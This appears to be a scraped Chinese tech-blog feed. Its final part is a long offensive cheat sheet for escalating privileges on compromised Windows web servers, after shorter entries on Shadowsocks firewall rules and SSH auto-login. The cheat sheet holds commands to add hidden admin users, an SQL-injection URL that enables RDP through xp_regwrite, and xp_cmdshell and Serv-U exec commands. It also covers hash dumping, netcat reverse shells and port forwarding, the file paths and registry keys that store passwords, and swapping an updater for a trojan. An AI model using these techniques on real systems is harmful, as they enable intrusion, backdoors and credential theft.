<p><strong>更多版本 shadowsocks 安装：</strong><br><a href="http://teddysun.com/355.html" target="_blank" rel="external">CentOS 下 shadowsocks-nodejs 一键安装脚本</a><br><a href="http://teddysun.com/357.html" target="_blank" rel="external">CentOS 下 shadowsocks-libev 一键安装脚本</a><br><a href="http://teddysun.com/358.html" target="_blank" rel="external">Debian 下 shadowsocks-libev 一键安装脚本</a><br><a href="http://teddysun.com/392.html" target="_blank" rel="external">CentOS 下 shadowsocks-go 一键安装脚本</a></p>
<p><strong>参考链接：</strong><br><a href="http://teddysun.com/339.html" target="_blank" rel="external">http://teddysun.com/339.html</a></p>
<p><strong>更新日志：</strong><br>（2015年01月21日）<br>1、修正配置文件，与官方给出的 sample 一致；<br>2、修改启动脚本，使用官方给出的后台启动和停止命令。<br>（2014年10月10日）<br>跟作者<a href="https://github.com/clowwindy/shadowsocks/issues/195" target="_blank" rel="external">反馈</a>了多用户多端口问题，作者已更新 <a href="https://github.com/clowwindy/shadowsocks/wiki/Configure-Multiple-Users" target="_blank" rel="external">Wiki 页面</a>。本教程新增多用户多端口配置文件的 sample 。<br>（2014年09月24日）<br>如何配置多用户？详见：<a href="https://github.com/clowwindy/shadowsocks/wiki/Configure-Multiple-Users" target="_blank" rel="external">这里</a><br>备注：Shadowsocks 已经支持多用户，在配置文件中增加不同的端口，对应不同的密码即可。<br>（2014年09月18日）<br>1、安装完成一段时间后，执行下面的命令可以升级到最新版本。</p>
<p><pre class="prettyprint lang-bsh">pip install -U shadowsocks</pre><br>注意升级完成后需要再重启一下。<br>（2014年07月12日）<br>1、修正获取公网 IP 时的一个问题。建议不要使用共享公网 IP 的 VPS 来搭建 Shadowsocks 服务。<br>（2014年05月29日）<br>1、增加 chkconfig 配置，实现 service 命令。<br>2、配置文件名从 /etc/config.json 改为 /etc/shadowsocks.json（与官方的命名一致）。<br>3、配置文件中新增 workers ，值默认为 1（与官方配置同步）。<br>（2014年05月27日）<br>1、修正开机自启动失效的问题。<br>2、优化是否后台启动成功的判断逻辑。<br>（2014年05月04日）<br>1、修正对增加防火墙端口逻辑的判断bug，对于已经放行 8989 端口的情况下，则无需再次增加。<br>2、修正获取服务器 IP 的判断bug，对于多 IP 的 VPS 或服务器，默认只取第一个公网 IP 写到配置文件（/etc/config.json）里。<br>3、加入开机自启动。</p>
<p><strong>特别说明：</strong><br>1、已安装旧版本的 shadowsocks 需要升级的话，直接运行 pip install -U shadowsocks 即可，升级完成后需重启。<br>2、关于 CentOS 的默认 iptables 防火墙规则 icmp-host-prohibited ，如果安装之后发现已经启动 shadowsocks，本地客户端却不能连接上，请检查 iptables 是不是有如下的一条规则：</p>
<p><pre class="prettyprint lang-bsh">REJECT     all  –  0.0.0.0/0            0.0.0.0/0           reject-with icmp-host-prohibited</pre><br>运行命令：</p>
<p><pre class="prettyprint lang-bsh">/etc/init.d/iptables status</pre><br>如果有这条规则的话，则添加的 8989 端口需手动更改一下，放到这条规则的上一行。编辑 /etc/sysconfig/iptables 文件，将：</p>
<p><pre class="prettyprint lang-bsh">-A INPUT -p tcp -m state –state NEW -m tcp –dport 8989 -j ACCEPT</pre><br>放在：</p>
<p><pre class="prettyprint lang-bsh">-A INPUT -j REJECT –reject-with icmp-host-prohibited</pre><br>的前面。最终效果如下：</p>
<p><pre class="prettyprint lang-bsh">-A INPUT -p tcp -m state –state NEW -m tcp –dport 8989 -j ACCEPT<br>-A INPUT -j REJECT –reject-with icmp-host-prohibited</pre><br>编辑完后，重启 iptables 防火墙。命令：/etc/init.d/iptables restart</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[ssh 自动登录脚本]]></title>
      <url>http://www.linux52.com/2015-02-11-ssh-e8-87-aa-e5-8a-a8-e7-99-bb-e5-bd-95-e8-84-9a-e6-9c-ac.html</url>
      <content type="html"><![CDATA[<div>ssh 一般要输入密码，自动设置的方法有两个，一个是通过建立ssh 密钥，一个是通过expect来建立下边看下用expect来建立的方法：</div><br><div>#!/usr/bin/expect -f # expect在哪个目录下用whereis找下，不同的系统expect安装路径不一样的，如果#没有安装在安装光盘里有的</div><br><div>set timeout -1</div><br><div>spawn ssh -l user_name host_name/ip</div><br><div>expect “password: “</div><br><div>send “your_password\n”</div><br><div>interact  #用exact这个指令是为了把控制权交给用户，来开始远程作业</div><br><div></div><br><div>注意：</div><br><div>     1.因为这个文件里边涉及到用户名和密码所以要设置好用户的权限除了用户本人不要让任何人读他或者是建立个密码文件</div><br><div>     2.expect 脚本虽然也是脚本但是不能用sh 这个指令去执行，而一般shell脚本可以用sh来执行,否则会文件不可读的报错信息</div><br><div></div><br><div>ssh免密码登陆：</div><br><div>如果在A（192.168.62.152）机上实现登陆b（192.168.62.200）机免密码那么在A机上执行下边的指令</div><br><div>ssh-keygen  -b 4096 -t rsa -P  ‘’</div><br><div><span style="color: #800000;">那样在用户家目录下会有个.ssh/id_rsa .ssh/id_rsa.pub 把~/.ssh/id_rsa.pub传到b机上</span></div><br><div><span style="color: #800000;">scp ~/.ssh/id_rsa.pub <a href="mailto:username@b192.168.62.200:/dir_name" target="_blank" rel="external">username@b192.168.62.200:/dir_name</a></span></div><br><div><span style="color: #800000;">登陆到192.168.62.200</span></div><br><div><span style="color: #800000;">cat $dir_name/id_rsa.pub &gt;&gt; ~/.<span style="color: #000000;">ssh/</span>authorized_keys<br></span>chmod 600 ~/.ssh/authorized_keys</div><br><div>结束后就可以在192.168.62.152上用ssh免密码登陆192.168.62.200</div><br><div>Notice:如果不能成功登陆那么，就要检查下权限问题及selinux及iptables</div><br><div>       尽量不要用复制粘贴的方式，直接用文件覆盖</div>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[提权小节]]></title>
      <url>http://www.linux52.com/2015-01-05-e6-8f-90-e6-9d-83-e5-b0-8f-e8-8a-82.html</url>
      <content type="html"><![CDATA[<p>【 web提权 】<br>1.能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行/c c:windowstempcookiesnet1.exe user</p>
<p>2.当提权成功，3389没开的情况下，上传开3389的vps没成功时，试试上传rootkit.asp 用刚提权的用户登录进去就是system权限，再试试一般就可以了。</p>
<p>3.cmd拒绝访问的话就自己上传一个cmd.exe 自己上传的后缀是不限制后缀的，cmd.exe/cmd.com/cmd.txt 都可以。</p>
<p>4.cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权。</p>
<p>6.c:windowstempcookies 这个目录</p>
<p>7.找sa密码或是root密码，直接利用大马的文件搜索功能直接搜索，超方便！</p>
<p>8.cmd执行exp没回显的解决方法：com路径那里输入exp路径C:RECYCLERpr.exe，命令那里清空(包括/c )输入”net user jianmei daxia /add”</p>
<p>9.增加用户并提升为管理员权限之后，如果连接不上3389，上传rootkit.asp脚本，访问会提示登录，用提权成功的账号密码登录进去就可以拥有管理员权限了。</p>
<p>10.有时变态监控不让添加用户，可以尝试抓管理哈希值，上传“PwDump7 破解当前管理密码(hash值)”，俩个都上传，执行PwDump7.exe就可以了，之后到网站去解密即可。</p>
<p>11.有时增加不上用户，有可能是密码过于简单或是过于复杂，还有就是杀软的拦截，命令 tasklist 查看进程</p>
<p>12.其实星外提权只要一个可执行的文件即可，先运行一遍cmd，之后把星外ee.exe命名为log.csv 就可以执行了。</p>
<p>13.用wt.asp扫出来的目录，其中红色的文件可以替换成exp，执行命令时cmd那里输入替换的文件路径，下面清空双引号加增加用户的命令。</p>
<p>14.提权很无奈的时候，可以试试TV远控，通杀内外网，穿透防火墙，很强大的。</p>
<p>15.当可读可写目录存在空格的时候，会出现这样的情况：’C:Documents’ 不是内部或外部命令，也不是可运行的程序 或批处理文件。解决办法是利用菜刀的交互shell切换到exp路径，如：Cd C:Documents and SettingsAll UsersApplication DataMicrosoft 目录<br>然后再执行exp或者cmd，就不会存在上面的情况了，aspshell一般是无法跳转目录的～</p>
<p>16.有时候可以添加用户，但是添加不到管理组，有可能是administrators改名了，net user administrator 看下本地组成员，*administrators</p>
<p>17.进入服务器，可以继续内网渗透 这个时候可以尝试打开路由器 默认帐号密码 admin admin</p>
<p>18.有的cmd执行很变态，asp马里，cmd路径填上面，下面填：””c:xxxexp.exe “whoami” 记得前面加两个双引号，不行后面也两个，不行就把exp的路径放在cmd那里，下面不变。</p>
<p>19.一般增加不上用户，或是想添加增加用户的vbs,bat,远控小马到服务器的启动项里，用“直接使服务器蓝屏重启的东东”这个工具可以实现，</p>
<p>20.执行PwDump7.exe抓哈希值的时候，建议重定向结果到保存为1.txt /c c:windowstempcookiesPwDump7.exe &gt;1.txt</p>
<p>21.菜刀执行的技巧，上传cmd到可执行目录，右击cmd 虚拟终端，help 然后setp c:windowstempcmd.exe 设置终端路径为：c:windowstempcmd.exe</p>
<p>22.当不支持aspx，或是支持但跨不了目录的时候，可以上传一个读iis的vps，执行命令列出所有网站目录，找到主站的目录就可以跨过去了。<br>上传cscript.exe到可执行目录，接着上传iispwd.vbs到网站根目录，cmd命令/c “c:windowstempcookiescscript.exe” d:webiispwd.vbs</p>
<p>23.如何辨别服务器是不是内网？ 192.168.x.x 172.16.x.x 10.x.x.x</p>
<p>(( dos命令大全 ))<br>查看版本：ver<br>查看权限：whoami<br>查看配置：systeminfo<br>查看用户：net user<br>查看进程：tasklist<br>查看正在运行的服务：tasklist /svc<br>查看开放的所有端口：netstat -ano<br>查询管理用户名：query user<br>查看搭建环境：ftp 127.0.0.1<br>查看指定服务的路径：sc qc Mysql<br>添加一个用户：net user jianmei daxia.asd /add<br>提升到管理权限：net localgroup administrators jianmei /add<br>添加用户并提升权限：net user jianmei daxia.asd /add &amp; net localgroup administrators jianmei /add<br>查看制定用户信息：net user jianmei<br>查看所有管理权限的用户：net localgroup administrators<br>加入远程桌面用户组：net localgroup “Remote Desktop Users” jianmei /add<br>突破最大连接数：mstsc /admin /v:127.0.0.1<br>删除用户：net user jianmei /del<br>删除管理员账户:net user administrator daxia.asd<br>更改系统登陆密码：net password daxia.asd<br>激活GUEST用户：net user guest /active:yes<br>开启TELNET服务：net start telnet<br>关闭麦咖啡：net stop “McAfee McShield”<br>关闭防火墙：net stop sharedaccess<br>查看当前目录的所有文件：dir c:windows<br>查看制定文件的内容：type c:windows1.asp<br>把cmd.exe复制到c:windows的temp目录下并命名为cmd.txt：copy c:windowstempcookiescmd.exe c:windowstempcmd.txt<br>开3389端口的命令：REG ADD HKLMSYSTEMCurrentControlSetControlTerminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f<br>查看补丁：dir c:windows&gt;a.txt&amp;(for %i in (KB952004.log KB956572.log KB2393802.log KB2503665.log KB2592799.log KB2621440.log KB2160329.log KB970483.log KB2124261.log KB977165.log KB958644.log) do @type a.txt|@find /i “%i”||@echo %i Not Installed!)&amp;del /f /q /a a.txt</p>
<p>(( SQL语句直接开启3389 ))<br>3389登陆关键注册表位置：HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminalServerDenyTSConnections<br>其中键值DenyTSConnections 直接控制着3389的开启和关闭，当该键值为0表示3389开启，1则表示关闭。<br>而MSSQL的xp_regwrite的存储过程可以对注册进行修改，我们使用这点就可以简单的修改DenyTSConnections键值，从而控制3389的关闭和开启。<br>开启3389的SQL语句：<br>syue.com/xiaohua.asp?id=100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEMCurrentControlSetControlTerminal Server’,’fDenyTSConnections’,’REG_DWORD’,0;–<br>关闭3389的SQL语句：<br>syue.com/xiaohua.asp?id=100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEMCurrentControlSetControlTerminal Server’,’fDenyTSConnections’,’REG_DWORD’,1;–</p>
<p>(( 常见杀软 ))<br>360tray.exe 360实时保护<br>ZhuDongFangYu.exe 360主动防御<br>KSafeTray.exe 金山卫士</p>
<p>McAfee McShield.exe 麦咖啡<br>SafeDogUpdateCenter.exe 服务器安全狗</p>
<p>(( windows提权中敏感目录和敏感注册表的利用 ))<br>敏感目录 目录权限 提权用途<br>C:Program Files 默认用户组users对该目录拥有查看权 可以查看服务器安装的应用软件<br>C:Documents and SettingsAll Users「开始」菜单程序 Everyone拥有查看权限 存放快捷方式，可以下载文件，属性查看安装路径<br>C:Documents and SettingsAll UsersDocuments Everyone完全控制权限 上传执行cmd及exp<br>C:windowssystem32inetsrv Everyone完全控制权限 上传执行cmd及exp<br>C:windowsmy.iniC:Program FilesMySQLMySQL Server 5.0my.ini 默认用户组users拥有查看权限 安装mysql时会将root密码写入该文件<br>C:windowssystem32 默认用户组users拥有查看权限 Shift后门一般是在该文件夹，可以下载后门破解密码<br>C:Documents and SettingsAll Users「开始」菜单程序启动 Everyone拥有查看权限 可以尝试向该目录写入vbs或bat，服务器重启后运行。<br>C:RECYCLERD:RECYCLER Everyone完全控制权限 回收站目录。常用于执行cmd及exp<br>C:Program FilesMicrosoft SQL Server 默认用户组users对该目录拥有查看权限 收集mssql相关信息，有时候该目录也存在可执行权限<br>C:Program FilesMySQL 默认用户组users对该目录拥有查看权限 找到MYSQL目录中user.MYD里的root密码<br>C:oraclexe 默认用户组users对该目录拥有查看权限 可以尝试利用Oracle的默认账户提权<br>C:WINDOWSsystem32config 默认用户组users对该目录拥有查看权限 尝试下载sam文件进行破解提权<br>C:Program FilesGeme6 FTP ServerRemote AdminRemote.ini 默认用户组users对该目录拥有查看权限 Remote.ini文件中存放着G6FTP的密码<br>c:Program FilesRhinoSoft.comServ-Uc:Program FilesServ-U 默认用户组users对该目录拥有查看权限 ServUDaemon.ini 中存储了虚拟主机网站路径和密码<br>c:windowssystem32inetsrvMetaBase.xml 默认用户组users对该目录拥有查看权限 IIS配置文件<br>C:tomcat5.0confresin.conf 默认用户组users对该目录拥有查看权限 Tomat存放密码的位置<br>C:ZKEYSSetup.ini 默认用户组users对该目录拥有查看权限 ZKEYS虚拟主机存放密码的位置</p>
<p>(( 提权中的敏感注册表位置 ))<br>HKEY_LOCAL_MACHINESOFTWAREMicrosoftMSSQLServerMSSQLServerSuperSocketNetLibTcp Mssql端口<br>HKLMSYSTEMCurrentControlSetControlTerminal Server DenyTSConnections 远程终端 值为0 即为开启<br>HKEY_LOCAL_MACHINESOFTWAREMySQL AB mssql的注册表位置<br>HKEY_LOCAL_MACHINESOFTWAREHZHOSTCONFIG 华众主机注册表配置位置<br>HKEY_LOCAL_MACHINESOFTWARECat SoftServ-UDomains1UserList serv-u的用户及密码（su加密）位置<br>HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminalServer WinStationsRDP-Tcp 在该注册表位置PortNumber的值即位3389端口值<br>HKEY_CURRENT_USERSoftwarePremiumSoftNavicatServers mysql管理工具Navicat的注册表位置，提权运用请谷歌<br>HKEY_LOCAL_MACHINESYSTEMRAdminv2.0ServerParameters Radmin的配置文件，提权中常将其导出进行进行覆盖提权<br>HKEY_LOCAL_MACHINESYSTEMControlSet002ServicesMSFtpsvcParametersVirtual Roots IIS注册表全版本泄漏用户路径和FTP用户名漏洞<br>HKEY_LOCAL_MACHINEsoftwarehzhostconfigSettingsmastersvrpass 华众主机在注册表中保存的mssql、mysql等密码<br>HKEY_LOCAL_MACHINESYSTEMLIWEIWENSOFTINSTALLFREEADMIN11 星外主机mssql的sa账号密码，双MD5加密<br>HKEY_LOCAL_MACHINESYSTEMControlSet002ServicesMSFtpsvcParametersVirtual RootsControlSet002 星外ftp的注册表位置，当然也包括ControlSet001、ControlSet003</p>
<p>(( wscript.shell的删除和恢复 ))<br>载wscript.shell对象，在cmd下或直接运行：regsvr32 /u %windir%system32WSHom.Ocx</p>
<p>卸载FSO对象，在cmd下或直接运行：regsvr32.exe /u %windir%system32scrrun.dll</p>
<p>卸载stream对象，在cmd下或直接运行：regsvr32 /s /u “C:ProgramFilesCommonFilesSystemadomsado15.dll”</p>
<p>如果想恢复的话只需要去掉/U 即可重新再注册以上相关ASP组件，这样子就可以用了</p>
<p>(( 如何找到准确的终端连接端口？))<br>在aspx大马里，点击“系统信息”第三个就是目前的3389端口<br>或是执行命令查看正在运行的服务：tasklist /svc<br>找到：svchost.exe 1688 TermService<br>记住1688这个ID值，<br>查看开放的所有端口：netstat -ano<br>找到1688这个ID值所对应的端口就是3389目前的端口</p>
<p>(( iis6提权提示Can not find wmiprvse.exe的突破方法 ))<br>突破方法一：<br>在IIS环境下，如果权限做得不严格，我们在aspx大马里面是有权限直接结束wmiprvse.exe进程的，进程查看里面直接K掉<br>在结束之后，它会再次运行，这时候的PID值的不一样的。这时候我们回来去运行exp，直接秒杀。</p>
<p>突破方法二：<br>虚拟主机，一般权限严格限制的，是没权限结束的，这时候我们可以考虑配合其他溢出工具让服务器强制重启，比如“直接使服务器蓝屏重启的东东”<br>甚至可以暴力点，DDOS秒杀之，管理发现服务器不通了首先肯定是以为服务器死机，等他重启下服务器（哪怕是IIS重启下）同样秒杀之。</p>
<p>(( 本地溢出提权 ))<br>计算机有个地方叫缓存区,程序的缓存区长度是被事先设定好的,如果用户输入的数据超过了这个缓存区的长度,那么这个程序就会溢出了.<br>缓存区溢出漏洞主要是由于许多软件没有对缓存区检查而造成的.<br>利用一些现成的造成溢出漏洞的exploit通过运行,把用户从users组或其它系统用户中提升到administrators组.<br>想要执行cmd命令，就要wscript.shell组建支持，或是支持aspx脚本也行，因为aspx脚本能调用.net组件来执行cmd的命令.</p>
<p>(( sa提权 ))<br>扫描开放的端口，1433开了就可以找sa密码提权，用大马里的搜索文件功能，sa密码一般在conn.asp config.asp web.config 这三个文件<br>也可以通过注册表找配置文件，看下支持aspx不，支持的话跨目录到别的站点上找，找到之后用aspshell自带的sql提权登录再执行命令创建用户即可。<br>aspx马提权执行命令有点不一样，点击数据库管理–选MSSQL–server=localhost;UID=sa;PWD=;database=master;Provider=SQLOLEDB–输入帐号密码连接即可<br>增加一个用户：exec master.dbo.xp_cmdshell ‘net user jianmei daxia.asd /add’;–<br>提升为管理员：exec master.dbo.xp_cmdshell ‘net localgroup administrators jianmei /add’;–<br>PS:如果增加不上，说明是xp_cmdshell组建没有，增加xp_cmdshell组建：Use master dbcc addextendedproc(‘xp_cmdshell’,’xplog70.dll’)</p>
<p>(( root提权 ))<br>利用mysql提权的前提就是,服务器安装了mysql,mysql的服务没有降权,是默认安装以系统权限继承的(system权限). 并且获得了root的账号密码<br>如何判断一台windows服务器上的mysql有没有降权？<br>cmd命令net user 如果存在 mysql mssql这样用户或者类似的.通常就是它的mssql mysql服务已经被降权运行了<br>如何判断服务器上是否开启了mysql服务？<br>开了3306端口，有的管理员会把默认端口改掉.另一个判断方法就是网站是否支持php,一般支持的话都是用mysql数据库的.<br>如何查看root密码？<br>在mysql的安装目录下找到user.myd这个文件，root就藏在里面，一般是40位cmd加密，一些php网站安装的时候用的是root用户,在conn.asp config.asp这些文件里。<br>有时会显得很乱，这时就需要自己去组合，前17位在第一行可以找到，还有23位在第三行或是其他行，自己继续找。<br>可以直接用php脚本里“mysql执行”，或是上传个UDF.php，如果网站不支持PHP，可以去旁一个php的站，也可以把UDF.php上传到别的phpshell上也可以。<br>填入帐号密码之后，自然就是安装DLL了，点击“自动安装Mysql BackDoor” 显示导出跟创建函数成功后，紧接着执行增加用户的命令即可。<br>注意：5.0版本以下(包括5.0的)默认c:windows系统目录就可以了，5.1版本以上的不能导出到系统目录下创建自定义函数，只能导出在mysql安装目录下的lib/plugin目录中<br>例如：D:/Program Files/MySQL/MySQL Server 5.1/lib/plugin/mysql.dll<br>如果密码看不见，或是组合不到40位，就本地安装一个mysql吧，<br>1、停止mysql服务<br>2、替换下载下来的3个文件（user.MYI user.MYD user.frm）<br>3、cmd切换到bin目录下，进入mysql安全模式，cmd命令：mysqld-nt –skip-grant-tables<br>4、重新打开一个cmd 切换到bin目录下，cmd命令：mysql -u root 版本不同有可能是：mysql -uroot -proot<br>5、最后查询一下就出来了select user,password from mysql.user;</p>
<p>(( serv-u提权 ))<br>这个文件里包含serv-u的md5密码：C:Program FilesRhinoSoft.comServ-U\ServUDaemon.ini<br>找到这个文件：ServUDaemon.ini 打开找到：LocalSetupPassword=nqFCE64E0056362E8FCAF813094EC39BC2<br>再拿md5密文去解密，再用现在的密码登陆提权即可。<br>serv-u提权的前提是43958端口开了，且知道帐号密码！<br>如果帐号密码默认，直接用shell里面的serv-u提权功能即可搞定，建议用aspx马、php马去提权，因为可以看回显。<br>530说明密碼不是默认的,回显330说明成功，900说明密码是默认的……………..<br>在程序里找个快捷方式，或是相关的文件进行下载到本地，再查看文件的属性，就可以找到serv-u的安装目录了。<br>目录有修改权限之serv-u提权：<br>找到serv-u的目录，再找到用户的配置文件ServUDaemon.ini，直接增加一个用户代码，保存！<br>接着本地cmd命令：ftp 服务器ip<br>回车，输入帐号密码再回车………………….<br>接着先试试普通的cmd命令提权，不行的话就使用ftp提权的命令：<br>Quote site exec net user jianmei daxia /add 增加一个用户<br>Quote site exec net localgroup administrators jianmei /add 提升到管理员权限<br>200 EXEC command successful (TID=33). 执行成功的回显信息<br>Maintenance=System 权限类型多加一行指定新加帐号为系统管理员<br>ReloadSettings=True 在修改ini文件后需加入此项，这时serv-u会自动刷新配置文件并生效</p>
<p>(( 端口转发 ))<br>什么情况下适合转发端口？<br>1.服务器是内网，我们无法连接。<br>2.服务器上有防火墙，阻断我们的连接。<br>转发端口的前提，我们是外网或是有外网服务器。<br>找个可读可写目录上传lcx.exe<br>本地cmd命令：lcx.exe -listen 1988 4567 （监听本地1988端口并转发到4567端口）<br>接着shell命令：/c c:windowstempcookieslcx.exe -slave 本机ip 1988 服务器ip 3389 （把服务器3389端口转发到本地4567端口）<br>之后本地连接：127.0.0.1:4567 (如果不想加上:4567的话，本地执行命令的时候，把4567换成3389来执行就行了)<br>以上是本机外网情况下操作，接着说下在外网服务器里如何操作：<br>上传lxc.exe cmd.exe到服务器且同一目录，执行cmd.exe命令：lcx.exe -listen 1988 4567<br>接着在aspxshell里点击端口映射，远程ip改为站点的ip，远端口程填1988，点击映射端口，接着在服务器里连接127.0.0.1:4567就可以了。</p>
<p>(( nc反弹提权 ))<br>当可以执行net user，但是不能建立用户时，就可以用NC反弹提权试下，特别是内网服务器，最好用NC反弹提权。<br>不过这种方法, 只要对方装了防火墙, 或是屏蔽掉了除常用的那几个端口外的所有端口，那么这种方法也失效了….<br>找个可读可写目录上传nc.exe cmd.exe</p>
<p>-l 监听本地入栈信息<br>-p port打开本地端口<br>-t 以telnet形式应答入栈请求<br>-e 程序重定向<br>本地cmd执行：nc -vv -l -p 52 进行反弹<br>接着在shell里执行命令：c:windowstempnc.exe -vv 服务器ip 999 -e c:windowstempcmd.exe 最好是80或8080这样的端口，被防火墙拦截的几率小很多<br>执行成功后本地cmd命令：cd/ （只是习惯而已）<br>接着以telnet命令连接服务器：telnet 服务器ip 999<br>回车出现已选定服务器的ip就说明成功了，接着权限比较大了，尝试建立用户！<br>坏蛋：<br>本地cmd执行：nc -vv -l -p 52 进行反弹<br>c:windowstempnc.exe -e c:windowstempcmd.exe 服务器ip 52<br>低调小飞：<br>shell执行命令c:windowstempnc.exe -l -p 110 -t -e c:windowstempcmd.exe</p>
<p>一般这样的格式执行成功率很小，不如直接在cmd那里输入：c:windowstempnc.exe 命令这里输入：-vv 服务器ip 999 -e c:windowstempcmd.exe<br>这个技巧成功率比上面那个大多了，不单单是nc可以这样，pr这些提权exp也是可以的。</p>
<p>(( 星外提权 ))<br>如何知道是不是星外主机？<br>第一：网站物理路径存在“freehost”<br>第二：asp马里点击程序，存在“7i24虚拟主机管理平台”“星外主机”之类的文件夹<br>默认帐号：freehostrunat<br>默认密码：fa41328538d7be36e83ae91a78a1b16f!7<br>freehostrunat这个用户是安装星外时自动建立的，已属于administrators管理组，而且密码不需要解密，直接登录服务器即可<br>星外常写目录：<br>C:RECYCLER<br>C:windowstemp<br>e:recycler<br>f:recycler<br>C:phpPEAR<br>C:WINDOWS7i24.comFreeHost<br>C:phpdev<br>C:System Volume Information<br>C:7i24.comserverdoctorlog<br>C:WINDOWSTemp<br>c:windowshchiblis.ibl<br>C:7i24.comiissafelog<br>C:7i24.comLinkGatelog<br>C:Program FilesThunder NetworkThunder7<br>C:Program FilesThunder NetworkThunder<br>C:Program FilesSymantec AntiVirusSAVRT<br>c:windowsDriverPacksCAM2<br>C:Program FilesFlashFXP<br>c:Program FilesMicrosoft SQL Server90SharedErrorDumps<br>C:Program FilesZendZendOptimizer-3.3.0<br>C:Program FilesCommon Files<br>c:Documents and SettingsAll UsersApplication DataHagel TechnologiesDU Meterlog.csv<br>c:Program Files360360SafedeepscanSectionmutex.db<br>c:Program FilesHeliconISAPI_Rewrite3error.log<br>c:Program FilesHeliconISAPI_Rewrite3Rewrite.log<br>c:Program FilesHeliconISAPI_Rewrite3httpd.conf<br>c:Program FilesCommon FilesSymantec SharedPersist.bak<br>c:Program FilesCommon FilesSymantec SharedValidate.dat<br>c:Program FilesCommon FilesSymantec SharedValidate.dat<br>C:Program FilesZendZendOptimizer-3.3.0docs<br>C:Documents and SettingsAll UsersDRM<br>C:Documents and SettingsAll UsersApplication DataMcAfeeDesktopProtection<br>C:Documents and SettingsAll UsersApplication Data360safesoftmgr<br>C:Program FilesZendZendOptimizer-3.3.0libOptimizer-3.3.0php-5.2.xZendOptimizer.dll<br>C:Documents and SettingsAll UsersApplication DataMicrosoftMedia Index</p>
<p>ee提权法：<br>找个可读可写目录上传ee.exe<br>cmd命令：/c c:windowstempcookiesee.exe -i （获取星外帐号的id值，例如回显：FreeHost ID：724）<br>接着命令：/c c:windowstempcookiesee.exe -u 724 （获取星外的帐号密码）</p>
<p>vbs提权法：<br>找个可读可写目录上传cscript.exe iispwd.vbs<br>cmd命令：/c “c:windowstempcookiescscript.exe” c:windowstempcookiesiispwd.vbs<br>意思是读取iis，这样一来，不但可以获取星外的帐号密码，还可以看到同服务器上的所有站点的目录。</p>
<p>可行思路大全：<br>经测试以下目录中的文件权限均为everyone，可以修改，可以上传同文件名替换，删除，最重要的是还可以执行：<br>360杀毒db文件替换:<br>c:Program Files360360SDdeepscanSectionmutex.db<br>c:Program Files360360SafedeepscanSectionmutex.db<br>C:Program Files360360SafeAntiSectionmutex.db<br>IISrewrite3 文件替换：<br>C:Program FilesHeliconISAPI_Rewrite3Rewrite.log<br>C:Program FilesHeliconISAPI_Rewrite3httpd.conf<br>C:Program FilesHeliconISAPI_Rewrite3error.log<br>诺顿杀毒文件替换:<br>c:Program FilesCommon FilesSymantec SharedPersist.bak<br>c:Program FilesCommon FilesSymantec SharedValidate.dat<br>c:Program FilesCommon FilesSymantec SharedPersist.Dat<br>一流过滤相关目录及文件：<br>C:7i24.comiissafelogstartandiischeck.txt<br>C:7i24.comiissafelogscanlog.htm<br>其他:<br>Zend文件替换：C:Program FilesZendZendOptimizer-3.3.0libOptimizer-3.3.0php-5.2.xZendOptimizer.dll<br>华盾文件替换：C:WINDOWShchiblis.ibl<br>Flash文件替换：C:WINDOWSsystem32MacromedFlashFlash10q.ocx<br>DU Meter流量统计信息日志文件替换：c:Documents and SettingsAll UsersApplication DataHagel TechnologiesDU Meterlog.csv</p>
<p>(( 360提权 ))<br>找个可读可写目录上传360.exe<br>cmd命令：/c c:windowstempcookies360.exe<br>会提示3段英文：</p>
<p>360 Antivirus Privilege Escalation Exploit By friddy 2010.2.2</p>
<p>You will get a Shift5 door!</p>
<p>Shift5 Backdoor created!</p>
<p>这是成功的征兆，接着连接服务器连按5下shift键，将弹出任务管理器，点击新建任务：explorer.exe 会出现桌面，接下来大家都会弄了……</p>
<p>(( 搜狗提权 ))<br>搜狗的目录默认是可读可写的，搜狗每隔一段时间就会自动升级，而升级的文件是pinyinup.exe<br>我们只要把这个文件替换为自己的远控木马，或是添加账户的批处理，等搜狗升级的时候，就可以达成我们的目的了。</p>
<p>(( 华众虚拟主机提权 ))<br>就经验来说，一般溢出提权对虚拟主机是无果的，而且华众又没有星外那么明显的漏洞。<br>所以华众提权关键之处就是搜集信息，主要注册表位置：<br>HKEY_LOCAL_MACHINESOFTWAREHZHOSTCONFIG<br>HKEY_LOCAL_MACHINEsoftwarehzhostconfigsettingsmysqlpass root密码<br>HKEY_LOCAL_MACHINEsoftwarehzhostconfigsettingsmssqlpss sa 密码<br>c:windowstemp 下有hzhost主机留下的ftp登陆记录有用户名和密码<br>以上信息配合hzhosts华众虚拟主机系统6.x 破解数据库密码工具使用<br>百度搜索：hzhosts华众虚拟主机系统6.x 破解数据库密码工具</p>
<p>(( N点虚拟主机 ))<br>N点虚拟主机管理系统默认数据库地址为：host_date#host # date#.mdb<br>rl直接输入不行 这里咱们替换下 #=%23 空格=%20<br>修改后的下载地址为/host_date/%23host%20%23%20date%23196.mdb<br>N点数据库下载之后找到sitehost表 FTPuser&amp;FTPpass 值 FTPpass是N点加密数据然后用N点解密工具解密得到FTP密码<br>N点默认安装路径C:Program FilesNpointSoftnpointhostweb<br>D:Program FilesNpointSoftnpointhostweb<br>默认权限可读。遇到对方所用虚拟主机是N点时候 可以考虑 读取该文件夹下载数据库<br>N点解密工具代码<br>&lt;%<br>set iishost=server.CreateObject(“npoint.host”)<br>x=iishost.Eduserpassword(“FTPpass值”,0)<br>response.write x<br>%&gt;<br>本地搭建N点环境在N点目录打开访问即可。得到密码减去后10位字符即为 N点的虚拟主机管理密码。<br>然后需要在管理系统登陆确认下 在hostcs 表 找到 Hostip 或者hostdomain<br>一般默认是 Hostip=127.0.0.1 hostdomain=www.npointhost.com 这里可以不管 因为 这里不修改的话就是服务器默认ip地址sitehost 表的host_domain就是绑定的域名 直接查下IP地址即可 咱们批量的话 扫描的地址即可。<br>管理系统地址即为IP地址 选择虚拟主机 